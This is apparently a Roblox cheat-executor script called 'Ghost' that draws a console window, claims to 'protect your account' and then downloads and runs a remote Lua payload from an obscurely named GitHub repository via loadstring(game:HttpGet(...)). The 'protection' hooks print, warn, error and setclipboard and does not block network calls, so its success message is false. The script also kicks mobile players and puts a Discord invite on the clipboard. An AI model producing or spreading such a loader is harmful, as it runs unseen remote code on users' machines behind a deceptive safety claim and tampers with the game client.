local me = game:GetService("Players").LocalPlayer
local tween = game:GetService("TweenService")
local input = game:GetService("UserInputService")

local UI = Instance.new("ScreenGui")
local s, c = pcall(function() UI.Parent = game.CoreGui end) if not s then UI.Parent = me.PlayerGui end
UI.Name = "Ghost 👻"
UI.ResetOnSpawn = false

local Main = Instance.new("Frame")
Main.Parent = UI
Main.Name = "Main"
Main.BackgroundColor3 = Color3.new(0.0313725, 0.0313725, 0.0313725)
Main.Position = UDim2.new(0.037, 0, 0.052, 0)
Main.Size = UDim2.new(0.649, 0, 0.77, 0)
Main.Visible = true

local uicmain = Instance.new("UICorner")
uicmain.Parent = Main
uicmain.CornerRadius = UDim.new(0, 10)

local dragger = Instance.new("Frame")
dragger.Parent = Main
dragger.Name = "Dragg"
dragger.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
dragger.Position = UDim2.new(0, 0, 0, 0)
dragger.Size = UDim2.new(1, 0, 0.066, 0)
dragger.Visible = true

local uicdragger = Instance.new("UICorner")
uicdragger.Parent = dragger
uicdragger.CornerRadius = UDim.new(0, 10)

local Tab = Instance.new("Frame")
Tab.Parent = dragger
Tab.Name = "Tab"
Tab.BackgroundColor3 = Color3.new(0.0313725, 0.0313725, 0.0313725)
Tab.Position = UDim2.new(0.014, 0, 0.215, 0)
Tab.Size = UDim2.new(0.242, 0, 1, 0)
Tab.Visible = true

local uictab = Instance.new("UICorner")
uictab.Parent = Tab
uictab.CornerRadius = UDim.new(0, 10)

local cmds = Instance.new("ImageLabel")
cmds.Parent = Tab
cmds.Name = "cmds"
cmds.BackgroundTransparency = 1
cmds.Position = UDim2.new(0.039, 0, 0.108, 0)
cmds.Size = UDim2.new(0, 25, 0, 25)
cmds.Image = "rbxassetid://16149184217"
cmds.Visible = true

local tabText = Instance.new("TextLabel")
tabText.Parent = Tab
tabText.Name = "TabText"
tabText.BackgroundTransparency = 1
tabText.Position = UDim2.new(0.198, 0, 0.185, 0)
tabText.Size = UDim2.new(0.618, 0, 0.622, 0)
tabText.TextColor3 = Color3.new(1, 1, 1)
tabText.RichText = true
tabText.TextSize = 13
tabText.Text = "Command Stroke"
tabText.Visible = true

local x = Instance.new("TextLabel")
x.Parent = Tab
x.Name = "x"
x.BackgroundTransparency = 1
x.Position = UDim2.new(0.862, 0, 0.2, 0)
x.Size = UDim2.new(0, 20, 0, 20)
x.RichText = true
x.TextSize = 13
x.TextColor3 = Color3.new(1, 1, 1)
x.Text = "x"
x.Visible = true

local add = Instance.new("TextLabel")
add.Parent = Tab
add.Name = "add"
add.BackgroundTransparency = 1
add.Position = UDim2.new(1.03, 0, 0.077, 0)
add.Size = UDim2.new(0, 20, 0, 30)
add.RichText = true
add.TextSize = 13
add.TextColor3 = Color3.new(1, 1, 1)
add.Text = "+"
add.Visible = true

local hide = Instance.new("TextLabel")
hide.Parent = Tab
hide.Name = "hide"
hide.BackgroundTransparency = 1
hide.Position = UDim2.new(3.789, 0, -0.1, 0)
hide.Size = UDim2.new(0, 20, 0, 30)
hide.RichText = true
hide.TextSize = 20
hide.TextColor3 = Color3.new(1, 1, 1)
hide.Text = "-"
hide.Visible = true

local full = Instance.new("TextLabel")
full.Parent = Tab
full.Name = "full"
full.BackgroundTransparency = 1
full.Position = UDim2.new(3.9, 0, -0.3, 0)
full.Size = UDim2.new(0, 11, 0, 46)
full.RichText = true
full.TextSize = 10
full.TextColor3 = Color3.new(1, 1, 1)
full.Text = "□"
full.Visible = true

local close = Instance.new("TextLabel")
close.Parent = Tab
close.Name = "close"
close.BackgroundTransparency = 1
close.Position = UDim2.new(3.98, 0, -0.07, 0)
close.Size = UDim2.new(0, 20, 0, 30)
close.RichText = true
close.TextSize = 13
close.TextColor3 = Color3.new(1, 1, 1)
close.Text = "x"
close.Visible = true

local scroll = Instance.new("ScrollingFrame")
scroll.Parent = Main
scroll.BackgroundTransparency = 1
scroll.Position = UDim2.new(0.013, 0, 0.079, 0)
scroll.Size = UDim2.new(0, 885, 0, 506)
scroll.CanvasSize = UDim2.new(0, 0, 2, 0)
scroll.ScrollBarThickness = 0
scroll.Visible = true

local ConsoleText = Instance.new("TextLabel")
ConsoleText.Parent = scroll
ConsoleText.Name = "ConsoleText"
ConsoleText.BackgroundTransparency = 1
ConsoleText.Position = UDim2.new(0.01, 0, 0.01, 0)
ConsoleText.Size = UDim2.new(0, 862, 0, 83)
ConsoleText.TextColor3 = Color3.new(1, 1, 1)
ConsoleText.RichText = true
ConsoleText.TextSize = 13
ConsoleText.Text = ""
ConsoleText.TextXAlignment = Enum.TextXAlignment.Left
ConsoleText.TextYAlignment = Enum.TextYAlignment.Top
ConsoleText.Visible = true

dragging = false
draggstart = nil
startpos = nil
dragginput = nil

function update(inp)
      local delta = inp.Position - draggstart
      local newpos = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)

      local anim = tween:Create(Main, TweenInfo.new(0.1), {Position = newpos})
      anim:Play()
end

dragger.InputBegan:Connect(function(inp)
      if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            draggstart = inp.Position
            startpos = Main.Position

            inp.Changed:Connect(function()
                  if inp.UserInputState == Enum.UserInputState.End then
                        dragging = false
                  end
            end)
      end
end)

dragger.InputChanged:Connect(function(inp)
      if inp.UserInputType == Enum.UserInputType.MouseMovement then
            dragginput = inp
      end
end)

input.InputChanged:Connect(function(input)
      if dragging and input == dragginput then
            update(input)
      end
end)

function Write(text, Type)
      local color
      if Type == "text" then
            color = "255, 255, 255"
      elseif Type == "succes" then
            color = "0, 255, 0"
      elseif Type == "error" then
            color = "255, 0, 0"
      else
            color = "255, 255, 255"
      end

      if ConsoleText.Text == "" then
            for i = 1, #text do
                  local currentSub = string.sub(text, 1, i)
                  ConsoleText.Text = ">"..string.format('<font color="rgb(%s)">   %s</font>', color, currentSub)
                  wait(0.1)
            end
      else
            local lines = string.split(ConsoleText.Text, "\n")
            local newLines = {}
            for _, line in ipairs(lines) do
                  table.insert(newLines, line)
            end

            for i = 1, #text do
                  local currentSub = string.sub(text, 1, i)
                  local newLine = ">"..string.format('<font color="rgb(%s)">   %s</font>', color, currentSub)
                  if i == 1 then
                        table.insert(newLines, newLine)
                  else
                        newLines[#newLines] = newLine
                  end
                  ConsoleText.Text = table.concat(newLines, "\n")
                  wait(0.05)
            end
      end
      wait()
end
wait(1)
Write("Welcome to Ghost 👻", "text")
wait(2)
Write("Loading...", "text")
repeat wait() until game:IsLoaded()
Write("Loaded", "succes")
wait(2)
Write("Protection your account...", "text")
local s, n = pcall(function()
      local isHookFunctionSupported = typeof(hookfunction) == "function"

      local function monitorHttps()
            local forbiddenFunctions = {print, warn, error, setclipboard}
            local HttpService = game:GetService("HttpService")

            if isHookFunctionSupported then
                  for _, func in ipairs(forbiddenFunctions) do
                        hookfunction(func, function(...)
                              local args = {...}
                              if tostring(args[1]):find("Http") then
                                    Write("Calling HTTPS detected and blocked", "error")
                              else
                                    return func(...)
                              end
                        end)
                  end
            else
                  local mt = getrawmetatable(game)
                  setreadonly(mt, false)
                  local oldIndex = mt.__index

                  mt.__index = function(self, key)
                        if table.find(forbiddenFunctions, key) then
                              return function(...)
                                    local args = {...}
                                    if tostring(args[1]):find("Http") then
                                          Write("Calling HTTPS detected and blocked", "error")
                                    else
                                          return oldIndex(self, key)(...)
                                    end
                              end
                        end
                        return oldIndex(self, key)
                  end
                  setreadonly(mt, true)
            end
      end
      monitorHttps()
end)
if not s then
      Write("Failed to protect your account", "error")
else
      Write("Your account succesfuly protected", "succes")
end
wait(2)
local mousecheck = input.MouseEnabled
if not mousecheck then
      setclipboard("https://discord.gg/5XAn83XFJP")
      UI:Destroy()
      me:Kick("Mobile version is soon back again... \n \n \n join to discrod for news \n https://discord.gg/5XAn83XFJP \n link is auto copied!")
else
      local su, on = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfsefesh.lua"))() end)
      if not su then
            Write("Failed to load, trying again...", "error")
            local suc, oh = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfsefesh.lua"))() end)
            if not suc then
                  Write("Failed to load, maybe in fix, join to discord https://discord.gg/5XAn83XFJP", "error")
                  wait(2)
                  pcall(function()
                        setclipboard("https://discord.gg/5XAn83XFJP")
                        Write("Link auto copied!", "text")
                  end)
                  wait(5)
                  Write("Deleting UI...", "text")
                  wait(1)
                  UI:Destroy()
            end
      end
      UI:Destroy()
end
